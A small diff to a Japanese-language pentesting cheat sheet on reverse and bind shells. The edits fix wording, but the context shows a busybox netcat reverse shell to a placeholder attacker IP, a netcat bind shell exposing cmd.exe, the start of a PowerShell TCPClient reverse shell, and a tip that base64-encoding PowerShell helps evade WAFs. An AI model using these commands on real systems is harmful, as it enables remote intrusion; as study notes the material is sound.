@@ -149,7 +149,7 @@ busybox nc <attacker_IP> <Port> -e sh
 > [!NOTE]
 > 実践ではほとんど使わない。
 
-1. ターゲットマシン上リスターを用意
+1. ターゲットマシン上でリスナーを用意
 ```cmd
 nc -lvnp <Port> -e "cmd.exe"
 ```
@@ -174,8 +174,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker
 
 #### Base64化したPowerShellリバースシェルワンライナー
 
-- powershellはbase64エンコードされたコードをデコードして実行可能であり、WAFの回避に役立つ
-	- 💡ワンライナーで実行する方法は汎用性が高い
+powershellはbase64エンコードされたコードをデコードして実行可能であり、WAFの回避に役立つ。
+ワンライナーで実行する方法は==非常に汎用性が高い==。
 
 1. 攻撃者のマシン上でPowerShellを起動
 ```zsh
